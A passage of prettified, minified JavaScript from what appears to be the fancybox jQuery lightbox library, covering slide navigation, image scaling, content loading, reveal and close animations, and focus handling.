            !f.isClosing &&
            (!f.isAnimating || !f.firstRun)
          ) {
            if (
              ((t = parseInt(t, 10)),
              !(r = f.current ? f.current.opts.loop : f.opts.loop) &&
                (t < 0 || t >= h))
            )
              return !1;
            if (
              ((o = f.firstRun = !Object.keys(f.slides).length),
              (l = f.current),
              (f.prevIndex = f.currIndex),
              (f.prevPos = f.currPos),
              (a = f.createSlide(t)),
              h > 1 &&
                ((r || a.index < h - 1) && f.createSlide(t + 1),
                (r || a.index > 0) && f.createSlide(t - 1)),
              (f.current = a),
              (f.currIndex = a.index),
              (f.currPos = a.pos),
              f.trigger("beforeShow", o),
              f.updateControls(),
              (a.forcedDuration = i),
              n.isNumeric(e)
                ? (a.forcedDuration = e)
                : (e = a.opts[o ? "animationDuration" : "transitionDuration"]),
              (e = parseInt(e, 10)),
              (s = f.isMoved(a)),
              a.$slide.addClass("fancybox-slide--current"),
              o)
            ) {
              a.opts.animationEffect &&
                e &&
                f.$refs.container.css("transition-duration", e + "ms"),
                f.$refs.container.addClass("fancybox-is-open").trigger("focus"),
                f.loadSlide(a),
                f.preload("image");
              return;
            }
            (c = n.fancybox.getTranslate(l.$slide)),
              (d = n.fancybox.getTranslate(f.$refs.stage)),
              n.each(f.slides, function (t, e) {
                n.fancybox.stop(e.$slide, !0);
              }),
              l.pos !== a.pos && (l.isComplete = !1),
              l.$slide.removeClass(
                "fancybox-slide--complete fancybox-slide--current"
              ),
              s
                ? ((p = c.left - (l.pos * c.width + l.pos * l.opts.gutter)),
                  n.each(f.slides, function (t, i) {
                    i.$slide
                      .removeClass("fancybox-animated")
                      .removeClass(function (t, e) {
                        return (e.match(/(^|\s)fancybox-fx-\S+/g) || []).join(
                          " "
                        );
                      });
                    var o = i.pos * c.width + i.pos * i.opts.gutter;
                    n.fancybox.setTranslate(i.$slide, {
                      top: 0,
                      left: o - d.left + p,
                    }),
                      i.pos !== a.pos &&
                        i.$slide.addClass(
                          "fancybox-slide--" +
                            (i.pos > a.pos ? "next" : "previous")
                        ),
                      g(i.$slide),
                      n.fancybox.animate(
                        i.$slide,
                        {
                          top: 0,
                          left:
                            (i.pos - a.pos) * c.width +
                            (i.pos - a.pos) * i.opts.gutter,
                        },
                        e,
                        function () {
                          i.$slide
                            .css({ transform: "", opacity: "" })
                            .removeClass(
                              "fancybox-slide--next fancybox-slide--previous"
                            ),
                            i.pos === f.currPos && f.complete();
                        }
                      );
                  }))
                : e &&
                  a.opts.transitionEffect &&
                  ((u =
                    "fancybox-animated fancybox-fx-" + a.opts.transitionEffect),
                  l.$slide.addClass(
                    "fancybox-slide--" + (l.pos > a.pos ? "next" : "previous")
                  ),
                  n.fancybox.animate(
                    l.$slide,
                    u,
                    e,
                    function () {
                      l.$slide
                        .removeClass(u)
                        .removeClass(
                          "fancybox-slide--next fancybox-slide--previous"
                        );
                    },
                    !1
                  )),
              a.isLoaded ? f.revealContent(a) : f.loadSlide(a),
              f.preload("image");
          }
        },
        createSlide: function (t) {
          var e,
            i,
            o = this;
          return (
            (i = (i = t % o.group.length) < 0 ? o.group.length + i : i),
            !o.slides[t] &&
              o.group[i] &&
              ((e = n('<div class="fancybox-slide"></div>').appendTo(
                o.$refs.stage
              )),
              (o.slides[t] = n.extend(!0, {}, o.group[i], {
                pos: t,
                $slide: e,
                isLoaded: !1,
              })),
              o.updateSlide(o.slides[t])),
            o.slides[t]
          );
        },
        scaleToActual: function (t, e, o) {
          var s,
            r,
            a,
            l,
            c,
            d = this,
            u = d.current,
            p = u.$content,
            f = n.fancybox.getTranslate(u.$slide).width,
            h = n.fancybox.getTranslate(u.$slide).height,
            g = u.width,
            v = u.height;
          !(d.isAnimating || d.isMoved()) &&
            p &&
            "image" == u.type &&
            u.isLoaded &&
            !u.hasError &&
            ((d.isAnimating = !0),
            n.fancybox.stop(p),
            (t = t === i ? 0.5 * f : t),
            (e = e === i ? 0.5 * h : e),
            (s = n.fancybox.getTranslate(p)),
            (s.top -= n.fancybox.getTranslate(u.$slide).top),
            (s.left -= n.fancybox.getTranslate(u.$slide).left),
            (l = g / s.width),
            (c = v / s.height),
            (r = 0.5 * f - 0.5 * g),
            (a = 0.5 * h - 0.5 * v),
            g > f &&
              ((r = s.left * l - (t * l - t)) > 0 && (r = 0),
              r < f - g && (r = f - g)),
            v > h &&
              ((a = s.top * c - (e * c - e)) > 0 && (a = 0),
              a < h - v && (a = h - v)),
            d.updateCursor(g, v),
            n.fancybox.animate(
              p,
              { top: a, left: r, scaleX: l, scaleY: c },
              o || 366,
              function () {
                d.isAnimating = !1;
              }
            ),
            d.SlideShow && d.SlideShow.isActive && d.SlideShow.stop());
        },
        scaleToFit: function (t) {
          var e,
            i = this,
            o = i.current,
            s = o.$content;
          !(i.isAnimating || i.isMoved()) &&
            s &&
            "image" == o.type &&
            o.isLoaded &&
            !o.hasError &&
            ((i.isAnimating = !0),
            n.fancybox.stop(s),
            (e = i.getFitPos(o)),
            i.updateCursor(e.width, e.height),
            n.fancybox.animate(
              s,
              {
                top: e.top,
                left: e.left,
                scaleX: e.width / s.width(),
                scaleY: e.height / s.height(),
              },
              t || 366,
              function () {
                i.isAnimating = !1;
              }
            ));
        },
        getFitPos: function (t) {
          var e,
            i,
            o,
            s,
            r = t.$content,
            a = t.$slide,
            l = t.width || t.opts.width,
            c = t.height || t.opts.height,
            d = {};
          return (
            !!t.isLoaded &&
            !!r &&
            !!r.length &&
            ((e = n.fancybox.getTranslate(this.$refs.stage).width),
            (i = n.fancybox.getTranslate(this.$refs.stage).height),
            (e -=
              parseFloat(a.css("paddingLeft")) +
              parseFloat(a.css("paddingRight")) +
              parseFloat(r.css("marginLeft")) +
              parseFloat(r.css("marginRight"))),
            (i -=
              parseFloat(a.css("paddingTop")) +
              parseFloat(a.css("paddingBottom")) +
              parseFloat(r.css("marginTop")) +
              parseFloat(r.css("marginBottom"))),
            (l && c) || ((l = e), (c = i)),
            (o = Math.min(1, e / l, i / c)),
            (l *= o),
            (c *= o),
            l > e - 0.5 && (l = e),
            c > i - 0.5 && (c = i),
            "image" === t.type
              ? ((d.top =
                  Math.floor((i - c) * 0.5) + parseFloat(a.css("paddingTop"))),
                (d.left =
                  Math.floor((e - l) * 0.5) + parseFloat(a.css("paddingLeft"))))
              : "video" === t.contentType &&
                ((s =
                  t.opts.width && t.opts.height
                    ? l / c
                    : t.opts.ratio || 16 / 9),
                c > l / s ? (c = l / s) : l > c * s && (l = c * s)),
            (d.width = l),
            (d.height = c),
            d)
          );
        },
        update: function (t) {
          var e = this;
          n.each(e.slides, function (n, i) {
            e.updateSlide(i, t);
          });
        },
        updateSlide: function (t, e) {
          var i = this,
            o = t && t.$content,
            s = t.width || t.opts.width,
            r = t.height || t.opts.height,
            a = t.$slide;
          i.adjustCaption(t),
            o &&
              (s || r || "video" === t.contentType) &&
              !t.hasError &&
              (n.fancybox.stop(o),
              n.fancybox.setTranslate(o, i.getFitPos(t)),
              t.pos === i.currPos && ((i.isAnimating = !1), i.updateCursor())),
            i.adjustLayout(t),
            a.length &&
              (a.trigger("refresh"),
              t.pos === i.currPos &&
                i.$refs.toolbar
                  .add(i.$refs.navigation.find(".fancybox-button--arrow_right"))
                  .toggleClass(
                    "compensate-for-scrollbar",
                    a.get(0).scrollHeight > a.get(0).clientHeight
                  )),
            i.trigger("onUpdate", t, e);
        },
        centerSlide: function (t) {
          var e = this,
            o = e.current,
            s = o.$slide;
          !e.isClosing &&
            o &&
            (s.siblings().css({ transform: "", opacity: "" }),
            s
              .parent()
              .children()
              .removeClass("fancybox-slide--previous fancybox-slide--next"),
            n.fancybox.animate(
              s,
              { top: 0, left: 0, opacity: 1 },
              t === i ? 0 : t,
              function () {
                s.css({ transform: "", opacity: "" }),
                  o.isComplete || e.complete();
              },
              !1
            ));
        },
        isMoved: function (t) {
          var e,
            i,
            o = t || this.current;
          return (
            !!o &&
            ((i = n.fancybox.getTranslate(this.$refs.stage)),
            (e = n.fancybox.getTranslate(o.$slide)),
            !o.$slide.hasClass("fancybox-animated") &&
              (Math.abs(e.top - i.top) > 0.5 ||
                Math.abs(e.left - i.left) > 0.5))
          );
        },
        updateCursor: function (t, e) {
          var i,
            o,
            s = this.current,
            r = this.$refs.container;
          s &&
            !this.isClosing &&
            this.Guestures &&
            (r.removeClass(
              "fancybox-is-zoomable fancybox-can-zoomIn fancybox-can-zoomOut fancybox-can-swipe fancybox-can-pan"
            ),
            (o = !!(i = this.canPan(t, e)) || this.isZoomable()),
            r.toggleClass("fancybox-is-zoomable", o),
            n("[data-fancybox-zoom]").prop("disabled", !o),
            i
              ? r.addClass("fancybox-can-pan")
              : o &&
                ("zoom" === s.opts.clickContent ||
                  (n.isFunction(s.opts.clickContent) &&
                    "zoom" == s.opts.clickContent(s)))
              ? r.addClass("fancybox-can-zoomIn")
              : s.opts.touch &&
                (s.opts.touch.vertical || this.group.length > 1) &&
                "video" !== s.contentType &&
                r.addClass("fancybox-can-swipe"));
        },
        isZoomable: function () {
          var t,
            e = this.current;
          return !!(
            e &&
            !this.isClosing &&
            "image" === e.type &&
            !e.hasError &&
            (!e.isLoaded ||
              ((t = this.getFitPos(e)) &&
                (e.width > t.width || e.height > t.height)))
          );
        },
        isScaledDown: function (t, e) {
          var o = !1,
            s = this.current,
            r = s.$content;
          return (
            t !== i && e !== i
              ? (o = t < s.width && e < s.height)
              : r &&
                (o =
                  (o = n.fancybox.getTranslate(r)).width < s.width &&
                  o.height < s.height),
            o
          );
        },
        canPan: function (t, e) {
          var o = this.current,
            s = null,
            r = !1;
          return (
            "image" === o.type &&
              (o.isComplete || (t && e)) &&
              !o.hasError &&
              ((r = this.getFitPos(o)),
              t !== i && e !== i
                ? (s = { width: t, height: e })
                : o.isComplete && (s = n.fancybox.getTranslate(o.$content)),
              s &&
                r &&
                (r =
                  Math.abs(s.width - r.width) > 1.5 ||
                  Math.abs(s.height - r.height) > 1.5)),
            r
          );
        },
        loadSlide: function (t) {
          var e,
            i,
            o,
            s = this;
          if (!t.isLoading && !t.isLoaded) {
            if (((t.isLoading = !0), !1 === s.trigger("beforeLoad", t)))
              return (t.isLoading = !1), !1;
            switch (
              ((e = t.type),
              (i = t.$slide)
                .off("refresh")
                .trigger("onReset")
                .addClass(t.opts.slideClass),
              e)
            ) {
              case "image":
                s.setImage(t);
                break;
              case "iframe":
                s.setIframe(t);
                break;
              case "html":
                s.setContent(t, t.src || t.content);
                break;
              case "video":
                s.setContent(
                  t,
                  t.opts.video.tpl
                    .replace(/\{\{src\}\}/gi, t.src)
                    .replace(
                      "{{format}}",
                      t.opts.videoFormat || t.opts.video.format || ""
                    )
                    .replace("{{poster}}", t.thumb || "")
                );
                break;
              case "inline":
                n(t.src).length ? s.setContent(t, n(t.src)) : s.setError(t);
                break;
              case "ajax":
                s.showLoading(t),
                  (o = n.ajax(
                    n.extend({}, t.opts.ajax.settings, {
                      url: t.src,
                      success: function (e, n) {
                        "success" === n && s.setContent(t, e);
                      },
                      error: function (e, n) {
                        e && "abort" !== n && s.setError(t);
                      },
                    })
                  )),
                  i.one("onReset", function () {
                    o.abort();
                  });
                break;
              default:
                s.setError(t);
            }
            return !0;
          }
        },
        setImage: function (t) {
          var i,
            o = this;
          setTimeout(function () {
            var e = t.$image;
            o.isClosing ||
              !t.isLoading ||
              (e && e.length && e[0].complete) ||
              t.hasError ||
              o.showLoading(t);
          }, 50),
            o.checkSrcset(t),
            (t.$content = n('<div class="fancybox-content"></div>')
              .addClass("fancybox-is-hidden")
              .appendTo(t.$slide.addClass("fancybox-slide--image"))),
            !1 !== t.opts.preload &&
              t.opts.width &&
              t.opts.height &&
              t.thumb &&
              ((t.width = t.opts.width),
              (t.height = t.opts.height),
              ((i = e.createElement("img")).onerror = function () {
                n(this).remove(), (t.$ghost = null);
              }),
              (i.onload = function () {
                o.afterLoad(t);
              }),
              (t.$ghost = n(i)
                .addClass("fancybox-image")
                .appendTo(t.$content)
                .attr("src", t.thumb))),
            o.setBigImage(t);
        },
        checkSrcset: function (e) {
          var n,
            i,
            o,
            s,
            r = e.opts.srcset || e.opts.image.srcset;
          if (r) {
            (o = t.devicePixelRatio || 1),
              (s = t.innerWidth * o),
              (i = r.split(",").map(function (t) {
                var e = {};
                return (
                  t
                    .trim()
                    .split(/\s+/)
                    .forEach(function (t, n) {
                      var i = parseInt(t.substring(0, t.length - 1), 10);
                      if (0 === n) return (e.url = t);
                      i && ((e.value = i), (e.postfix = t[t.length - 1]));
                    }),
                  e
                );
              })).sort(function (t, e) {
                return t.value - e.value;
              });
            for (var a = 0; a < i.length; a++) {
              var l = i[a];
              if (
                ("w" === l.postfix && l.value >= s) ||
                ("x" === l.postfix && l.value >= o)
              ) {
                n = l;
                break;
              }
            }
            !n && i.length && (n = i[i.length - 1]),
              n &&
                ((e.src = n.url),
                e.width &&
                  e.height &&
                  "w" == n.postfix &&
                  ((e.height = (e.width / e.height) * n.value),
                  (e.width = n.value)),
                (e.opts.srcset = r));
          }
        },
        setBigImage: function (t) {
          var i = this,
            o = e.createElement("img"),
            s = n(o);
          (t.$image = s
            .one("error", function () {
              i.setError(t);
            })
            .one("load", function () {
              var e;
              t.$ghost ||
                (i.resolveImageSlideSize(
                  t,
                  this.naturalWidth,
                  this.naturalHeight
                ),
                i.afterLoad(t)),
                i.isClosing ||
                  (t.opts.srcset &&
                    (((e = t.opts.sizes) && "auto" !== e) ||
                      (e =
                        (t.width / t.height > 1 && c.width() / c.height() > 1
                          ? "100"
                          : Math.round((t.width / t.height) * 100)) + "vw"),
                    s.attr("sizes", e).attr("srcset", t.opts.srcset)),
                  t.$ghost &&
                    setTimeout(function () {
                      t.$ghost && !i.isClosing && t.$ghost.hide();
                    }, Math.min(300, Math.max(1e3, t.height / 1600))),
                  i.hideLoading(t));
            })
            .addClass("fancybox-image")
            .attr("src", t.src)
            .appendTo(t.$content)),
            (o.complete || "complete" == o.readyState) &&
            s.naturalWidth &&
            s.naturalHeight
              ? s.trigger("load")
              : o.error && s.trigger("error");
        },
        resolveImageSlideSize: function (t, e, n) {
          var i = parseInt(t.opts.width, 10),
            o = parseInt(t.opts.height, 10);
          (t.width = e),
            (t.height = n),
            i > 0 && ((t.width = i), (t.height = Math.floor((i * n) / e))),
            o > 0 && ((t.width = Math.floor((o * e) / n)), (t.height = o));
        },
        setIframe: function (t) {
          var e,
            o = this,
            s = t.opts.iframe,
            r = t.$slide;
          (t.$content = n(
            '<div class="fancybox-content' +
              (s.preload ? " fancybox-is-hidden" : "") +
              '"></div>'
          )
            .css(s.css)
            .appendTo(r)),
            r.addClass("fancybox-slide--" + t.contentType),
            (t.$iframe = e =
              n(s.tpl.replace(/\{rnd\}/g, new Date().getTime()))
                .attr(s.attr)
                .appendTo(t.$content)),
            s.preload
              ? (o.showLoading(t),
                e.on("load.fb error.fb", function (e) {
                  (this.isReady = 1),
                    t.$slide.trigger("refresh"),
                    o.afterLoad(t);
                }),
                r.on("refresh.fb", function () {
                  var n,
                    o,
                    a = t.$content,
                    l = s.css.width,
                    c = s.css.height;
                  if (1 === e[0].isReady) {
                    try {
                      o = (n = e.contents()).find("body");
                    } catch (d) {}
                    o &&
                      o.length &&
                      o.children().length &&
                      (r.css("overflow", "visible"),
                      a.css({
                        width: "100%",
                        "max-width": "100%",
                        height: "9999px",
                      }),
                      l === i &&
                        (l = Math.ceil(
                          Math.max(o[0].clientWidth, o.outerWidth(!0))
                        )),
                      a.css("width", l || "").css("max-width", ""),
                      c === i &&
                        (c = Math.ceil(
                          Math.max(o[0].clientHeight, o.outerHeight(!0))
                        )),
                      a.css("height", c || ""),
                      r.css("overflow", "auto")),
                      a.removeClass("fancybox-is-hidden");
                  }
                }))
              : o.afterLoad(t),
            e.attr("src", t.src),
            r.one("onReset", function () {
              try {
                n(this)
                  .find("iframe")
                  .hide()
                  .unbind()
                  .attr("src", "//about:blank");
              } catch (e) {}
              n(this).off("refresh.fb").empty(),
                (t.isLoaded = !1),
                (t.isRevealed = !1);
            });
        },
        setContent: function (t, e) {
          var i;
          this.isClosing ||
            ((this.hideLoading(t),
            t.$content && n.fancybox.stop(t.$content),
            t.$slide.empty(),
            (i = e) && i.hasOwnProperty && i instanceof n && e.parent().length)
              ? ((e.hasClass("fancybox-content") ||
                  e.parent().hasClass("fancybox-content")) &&
                  e.parents(".fancybox-slide").trigger("onReset"),
                (t.$placeholder = n("<div>").hide().insertAfter(e)),
                e.css("display", "inline-block"))
              : !t.hasError &&
                ("string" === n.type(e) &&
                  (e = n("<div>").append(n.trim(e)).contents()),
                t.opts.filter && (e = n("<div>").html(e).find(t.opts.filter))),
            t.$slide.one("onReset", function () {
              n(this).find("video,audio").trigger("pause"),
                t.$placeholder &&
                  (t.$placeholder
                    .after(e.removeClass("fancybox-content").hide())
                    .remove(),
                  (t.$placeholder = null)),
                t.$smallBtn && (t.$smallBtn.remove(), (t.$smallBtn = null)),
                t.hasError ||
                  (n(this).empty(), (t.isLoaded = !1), (t.isRevealed = !1));
            }),
            n(e).appendTo(t.$slide),
            n(e).is("video,audio") &&
              (n(e).addClass("fancybox-video"),
              n(e).wrap("<div></div>"),
              (t.contentType = "video"),
              (t.opts.width = t.opts.width || n(e).attr("width")),
              (t.opts.height = t.opts.height || n(e).attr("height"))),
            (t.$content = t.$slide
              .children()
              .filter("div,form,main,video,audio,article,.fancybox-content")
              .first()),
            t.$content.siblings().hide(),
            t.$content.length ||
              (t.$content = t.$slide
                .wrapInner("<div></div>")
                .children()
                .first()),
            t.$content.addClass("fancybox-content"),
            t.$slide.addClass("fancybox-slide--" + t.contentType),
            this.afterLoad(t));
        },
        setError: function (t) {
          (t.hasError = !0),
            t.$slide
              .trigger("onReset")
              .removeClass("fancybox-slide--" + t.contentType)
              .addClass("fancybox-slide--error"),
            (t.contentType = "html"),
            this.setContent(t, this.translate(t, t.opts.errorTpl)),
            t.pos === this.currPos && (this.isAnimating = !1);
        },
        showLoading: function (t) {
          (t = t || this.current) &&
            !t.$spinner &&
            (t.$spinner = n(this.translate(this, this.opts.spinnerTpl))
              .appendTo(t.$slide)
              .hide()
              .fadeIn("fast"));
        },
        hideLoading: function (t) {
          (t = t || this.current) &&
            t.$spinner &&
            (t.$spinner.stop().remove(), delete t.$spinner);
        },
        afterLoad: function (t) {
          this.isClosing ||
            ((t.isLoading = !1),
            (t.isLoaded = !0),
            this.trigger("afterLoad", t),
            this.hideLoading(t),
            !t.opts.smallBtn ||
              (t.$smallBtn && t.$smallBtn.length) ||
              (t.$smallBtn = n(
                this.translate(t, t.opts.btnTpl.smallBtn)
              ).appendTo(t.$content)),
            t.opts.protect &&
              t.$content &&
              !t.hasError &&
              (t.$content.on("contextmenu.fb", function (t) {
                return 2 == t.button && t.preventDefault(), !0;
              }),
              "image" === t.type &&
                n('<div class="fancybox-spaceball"></div>').appendTo(
                  t.$content
                )),
            this.adjustCaption(t),
            this.adjustLayout(t),
            t.pos === this.currPos && this.updateCursor(),
            this.revealContent(t));
        },
        adjustCaption: function (t) {
          var e,
            n = t || this.current,
            i = n.opts.caption,
            o = n.opts.preventCaptionOverlap,
            s = this.$refs.caption,
            r = !1;
          s.toggleClass("fancybox-caption--separate", o),
            o &&
              i &&
              i.length &&
              (n.pos !== this.currPos
                ? ((e = s.clone().appendTo(s.parent()))
                    .children()
                    .eq(0)
                    .empty()
                    .html(i),
                  (r = e.outerHeight(!0)),
                  e.empty().remove())
                : this.$caption && (r = this.$caption.outerHeight(!0)),
              n.$slide.css("padding-bottom", r || ""));
        },
        adjustLayout: function (t) {
          var e,
            n,
            i,
            o,
            s = t || this.current;
          s.isLoaded &&
            !0 !== s.opts.disableLayoutFix &&
            (s.$content.css("margin-bottom", ""),
            s.$content.outerHeight() > s.$slide.height() + 0.5 &&
              ((i = s.$slide[0].style["padding-bottom"]),
              parseFloat((o = s.$slide.css("padding-bottom"))) > 0 &&
                ((e = s.$slide[0].scrollHeight),
                s.$slide.css("padding-bottom", 0),
                1 > Math.abs(e - s.$slide[0].scrollHeight) && (n = o),
                s.$slide.css("padding-bottom", i))),
            s.$content.css("margin-bottom", n));
        },
        revealContent: function (t) {
          var e,
            o,
            s,
            r,
            a = this,
            l = t.$slide,
            c = !1,
            d = !1,
            u = a.isMoved(t),
            p = t.isRevealed;
          if (
            ((t.isRevealed = !0),
            (e = t.opts[a.firstRun ? "animationEffect" : "transitionEffect"]),
            (s =
              t.opts[a.firstRun ? "animationDuration" : "transitionDuration"]),
            (s = parseInt(i === t.forcedDuration ? s : t.forcedDuration, 10)),
            (u || t.pos !== a.currPos || !s) && (e = !1),
            "zoom" === e &&
              (t.pos === a.currPos &&
              s &&
              "image" === t.type &&
              !t.hasError &&
              (d = a.getThumbPos(t))
                ? (c = a.getFitPos(t))
                : (e = "fade")),
            "zoom" === e)
          ) {
            (a.isAnimating = !0),
              (c.scaleX = c.width / d.width),
              (c.scaleY = c.height / d.height),
              "auto" == (r = t.opts.zoomOpacity) &&
                (r = Math.abs(t.width / t.height - d.width / d.height) > 0.1),
              r && ((d.opacity = 0.1), (c.opacity = 1)),
              n.fancybox.setTranslate(
                t.$content.removeClass("fancybox-is-hidden"),
                d
              ),
              g(t.$content),
              n.fancybox.animate(t.$content, c, s, function () {
                (a.isAnimating = !1), a.complete();
              });
            return;
          }
          if ((a.updateSlide(t), !e)) {
            t.$content.removeClass("fancybox-is-hidden"),
              p ||
                !u ||
                "image" !== t.type ||
                t.hasError ||
                t.$content.hide().fadeIn("fast"),
              t.pos === a.currPos && a.complete();
            return;
          }
          n.fancybox.stop(l),
            (o =
              "fancybox-slide--" +
              (t.pos >= a.prevPos ? "next" : "previous") +
              " fancybox-animated fancybox-fx-" +
              e),
            l.addClass(o).removeClass("fancybox-slide--current"),
            t.$content.removeClass("fancybox-is-hidden"),
            g(l),
            "image" !== t.type && t.$content.hide().show(0),
            n.fancybox.animate(
              l,
              "fancybox-slide--current",
              s,
              function () {
                l.removeClass(o).css({ transform: "", opacity: "" }),
                  t.pos === a.currPos && a.complete();
              },
              !0
            );
        },
        getThumbPos: function (t) {
          var e,
            i,
            o,
            s,
            r,
            a = !1,
            l = t.$thumb;
          return (
            !!(l && m(l[0])) &&
            ((e = n.fancybox.getTranslate(l)),
            (i = parseFloat(l.css("border-top-width") || 0)),
            (o = parseFloat(l.css("border-right-width") || 0)),
            (s = parseFloat(l.css("border-bottom-width") || 0)),
            (r = parseFloat(l.css("border-left-width") || 0)),
            (a = {
              top: e.top + i,
              left: e.left + r,
              width: e.width - o - r,
              height: e.height - i - s,
              scaleX: 1,
              scaleY: 1,
            }),
            e.width > 0 && e.height > 0 && a)
          );
        },
        complete: function () {
          var t,
            e = this,
            i = e.current,
            o = {};
          !e.isMoved() &&
            i.isLoaded &&
            (i.isComplete ||
              ((i.isComplete = !0),
              i.$slide.siblings().trigger("onReset"),
              e.preload("inline"),
              g(i.$slide),
              i.$slide.addClass("fancybox-slide--complete"),
              n.each(e.slides, function (t, i) {
                i.pos >= e.currPos - 1 && i.pos <= e.currPos + 1
                  ? (o[i.pos] = i)
                  : i && (n.fancybox.stop(i.$slide), i.$slide.off().remove());
              }),
              (e.slides = o)),
            (e.isAnimating = !1),
            e.updateCursor(),
            e.trigger("afterShow"),
            i.opts.video.autoStart &&
              i.$slide
                .find("video,audio")
                .filter(":visible:first")
                .trigger("play")
                .one("ended", function () {
                  Document.exitFullscreen
                    ? Document.exitFullscreen()
                    : this.webkitExitFullscreen && this.webkitExitFullscreen(),
                    e.next();
                }),
            i.opts.autoFocus &&
              "html" === i.contentType &&
              ((t = i.$content.find("input[autofocus]:enabled:visible:first"))
                .length
                ? t.trigger("focus")
                : e.focus(null, !0)),
            i.$slide.scrollTop(0).scrollLeft(0));
        },
        preload: function (t) {
          var e, n;
          !(this.group.length < 2) &&
            ((n = this.slides[this.currPos + 1]),
            (e = this.slides[this.currPos - 1]) &&
              e.type === t &&
              this.loadSlide(e),
            n && n.type === t && this.loadSlide(n));
        },
        focus: function (t, i) {
          var o, s;
          !this.isClosing &&
            ((o = (o =
              !t && this.current && this.current.isComplete
                ? this.current.$slide.find(
                    "*:visible" + (i ? ":not(.fancybox-close-small)" : "")
                  )
                : this.$refs.container.find("*:visible"))
              .filter(
                'a[href],area[href],input:not([disabled]):not([type="hidden"]):not([aria-hidden]),select:not([disabled]):not([aria-hidden]),textarea:not([disabled]):not([aria-hidden]),button:not([disabled]):not([aria-hidden]),iframe,object,embed,video,audio,[contenteditable],[tabindex]:not([tabindex^="-"])'
              )
              .filter(function () {
                return (
                  "hidden" !== n(this).css("visibility") &&
                  !n(this).hasClass("disabled")
                );
              })).length
              ? ((s = o.index(e.activeElement)),
                t && t.shiftKey
                  ? (s < 0 || 0 == s) &&
                    (t.preventDefault(), o.eq(o.length - 1).trigger("focus"))
                  : (s < 0 || s == o.length - 1) &&
                    (t && t.preventDefault(), o.eq(0).trigger("focus")))
              : this.$refs.container.trigger("focus"));
        },
        activate: function () {
          var t = this;
          n(".fancybox-container").each(function () {
            var e = n(this).data("FancyBox");
            e &&
              e.id !== t.id &&
              !e.isClosing &&
              (e.trigger("onDeactivate"), e.removeEvents(), (e.isVisible = !1));
          }),
            (t.isVisible = !0),
            (t.current || t.isIdle) && (t.update(), t.updateControls()),
            t.trigger("onActivate"),
            t.addEvents();
        },
        close: function (t, e) {
          var i,
            o,
            s,
            r,
            a,
            l,
            c,
            d = this,
            u = d.current,
            f = function () {
              d.cleanUp(t);
            };
          return (
            !d.isClosing &&
            (((d.isClosing = !0), !1 === d.trigger("beforeClose", t))
              ? ((d.isClosing = !1),
                p(function () {
                  d.update();
                }),
                !1)
              : (d.removeEvents(),
                (s = u.$content),
                (i = u.opts.animationEffect),
                (o = n.isNumeric(e) ? e : i ? u.opts.animationDuration : 0),
                u.$slide.removeClass(
                  "fancybox-slide--complete fancybox-slide--next fancybox-slide--previous fancybox-animated"
                ),
                !0 !== t ? n.fancybox.stop(u.$slide) : (i = !1),
                u.$slide.siblings().trigger("onReset").remove(),
                o &&
                  d.$refs.container
                    .removeClass("fancybox-is-open")
                    .addClass("fancybox-is-closing")
                    .css("transition-duration", o + "ms"),
                d.hideLoading(u),
                d.hideControls(!0),
                d.updateCursor(),
                "zoom" !== i ||
                  (s &&
                    o &&
                    "image" === u.type &&
                    !d.isMoved() &&
                    !u.hasError &&
                    (c = d.getThumbPos(u))) ||
                  (i = "fade"),
                "zoom" === i)
              ? (n.fancybox.stop(s),
                (l = {
                  top: (r = n.fancybox.getTranslate(s)).top,
                  left: r.left,
                  scaleX: r.width / c.width,
                  scaleY: r.height / c.height,
                  width: c.width,
                  height: c.height,
                }),
                "auto" == (a = u.opts.zoomOpacity) &&
                  (a = Math.abs(u.width / u.height - c.width / c.height) > 0.1),
                a && (c.opacity = 0),
                n.fancybox.setTranslate(s, l),
                g(s),
                n.fancybox.animate(s, c, o, f),
                !0)
              : (i && o
                  ? n.fancybox.animate(
                      u.$slide
                        .addClass("fancybox-slide--previous")
                        .removeClass("fancybox-slide--current"),
                      "fancybox-animated fancybox-fx-" + i,
                      o,
                      f
                    )
                  : !0 === t
                  ? setTimeout(f, o)
                  : f(),
                !0))
          );
        },
        cleanUp: function (e) {
          var i,
            o,
            s,
            r = this,
            a = r.current.opts.$orig;
          r.current.$slide.trigger("onReset"),
            r.$refs.container.empty().remove(),
            r.trigger("afterClose", e),
            r.current.opts.backFocus &&
              ((a && a.length && a.is(":visible")) || (a = r.$trigger),
              a &&
                a.length &&
                ((o = t.scrollX),
                (s = t.scrollY),
                a.trigger("focus"),
                n("html, body").scrollTop(s).scrollLeft(o))),
            (r.current = null),
            (i = n.fancybox.getInstance())
              ? i.activate()
              : (n("body").removeClass(
                  "fancybox-active compensate-for-scrollbar"
                ),
                n("#fancybox-style-noscroll").remove());
        },
        trigger: function (t, e) {
          var i,
            o = Array.prototype.slice.call(arguments, 1),
            s = e && e.opts ? e : this.current;
          if (
            (s ? o.unshift(s) : (s = this),
            o.unshift(this),
            n.isFunction(s.opts[t]) && (i = s.opts[t].apply(s, o)),
            !1 === i)
          )
            return i;
          "afterClose" !== t && this.$refs
            ? this.$refs.container.trigger(t + ".fb", o)
            : d.trigger(t + ".fb", o);
        },
        updateControls: function () {
          var t = this,
            i = t.current,
            o = i.index,
            s = t.$refs.container,
            r = t.$refs.caption,
            a = i.opts.caption;
          i.$slide.trigger("refresh"),
            a && a.length
              ? ((t.$caption = r), r.children().eq(0).html(a))
              : (t.$caption = null),
            t.hasHiddenControls || t.isIdle || t.showControls(),
            s.find("[data-fancybox-count]").html(t.group.length),
            s.find("[data-fancybox-index]").html(o + 1),
            s
              .find("[data-fancybox-prev]")
              .prop("disabled", !i.opts.loop && o <= 0),
            s
              .find("[data-fancybox-next]")
              .prop("disabled", !i.opts.loop && o >= t.group.length - 1),
            "image" === i.type
              ? s
                  .find("[data-fancybox-zoom]")
                  .show()
                  .end()
                  .find("[data-fancybox-download]")
                  .attr("href", i.opts.image.src || i.src)
                  .show()
              : i.opts.toolbar &&
                s.find("[data-fancybox-download],[data-fancybox-zoom]").hide(),
            n(e.activeElement).is(":hidden,[disabled]") &&
              t.$refs.container.trigger("focus");
        },
        hideControls: function (t) {
          var e = ["infobar", "toolbar", "nav"];
          (t || !this.current.opts.preventCaptionOverlap) && e.push("caption"),
            this.$refs.container.removeClass(
              e
                .map(function (t) {
                  return "fancybox-show-" + t;
                })
                .join(" ")
            ),
            (this.hasHiddenControls = !0);
        },
        showControls: function () {
          var t = this,
            e = t.current ? t.current.opts : t.opts,
            n = t.$refs.container;
          (t.hasHiddenControls = !1),
            (t.idleSecondsCounter = 0),
            n
              .toggleClass("fancybox-show-toolbar", !!(e.toolbar && e.buttons))
              .toggleClass(
